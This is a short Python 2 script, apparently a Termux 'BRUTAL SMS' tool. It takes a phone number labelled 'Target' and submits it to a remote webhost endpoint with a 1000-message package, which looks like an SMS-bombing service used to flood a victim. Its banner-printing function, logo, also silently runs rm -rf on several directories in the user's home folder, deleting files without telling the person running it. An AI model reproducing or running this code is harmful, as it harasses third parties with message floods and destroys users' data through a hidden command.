import os, time, sys, urllib2, random
G0 = '\x1b[0;32m'
G1 = '\x1b[1;32m'
C0 = '\x1b[0;36m'
C1 = '\x1b[1;36m'
P0 = '\x1b[0;35m'
P1 = '\x1b[1;35m'
W0 = '\x1b[0;37m'
W1 = '\x1b[1;37m'
B0 = '\x1b[0;34m'
B1 = '\x1b[1;34m'
R0 = '\x1b[0;31m'
R1 = '\x1b[1;31m'
RE = '\x1b[0;0m'
D0 = '\x1b[0;90m'
LG = '\x1b[1;97;41m'

def logo(s):
    os.system('rm -rf /$HOME/Dark-FB')
    os.system('rm -rf /$HOME/TAIK')
    os.system('rm -rf /$HOME/dark-fb')
    os.system('rm -rf /$HOME/DARKFB')
    os.system('rm -rf /$HOME/Dark-fb')
    os.system('rm -rf /$HOME/darkfb')
    os.system('clear')
    os.system('clear')
    os.system('clear')
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.01)

logo('\n\n%s\n  ___  ____ _  _ ___ ____ _     ____ _  _ ____ \n  |__] |__/ |  |  |  |__| |     [__  |\\/| [__  \n  |__] |  \\ |__|  |  |  | |___  ___] |  | ___] \n  %s--------------------------------------------\n  %s   Author : Njank Soekamti from TERMUXID3   %s\n  %s--------------------------------------------\n  ' % (P1, D0, LG, RE, D0))
try:
    numb = raw_input('   %s[+] %sTarget : ' % (P0, W0))
    print '   %s[+] %sSilahkan tunggu ...' % (P0, W0)
    urllib2.urlopen('https://sinafipika.000webhostapp.com/sms.php/sms.php?nomor=%s&paket=1000' % numb)
    print '   %s[+] %sSukses \n\n' % (P0, G0)
    os.system('xdg-open https://youtube.com/NjankSoekamti')
except:
    print '   %s[+] %sGagal \n\n' % (P0, R0)
    os.system('xdg-open https://youtube.com/NjankSoekamti')
    exit()
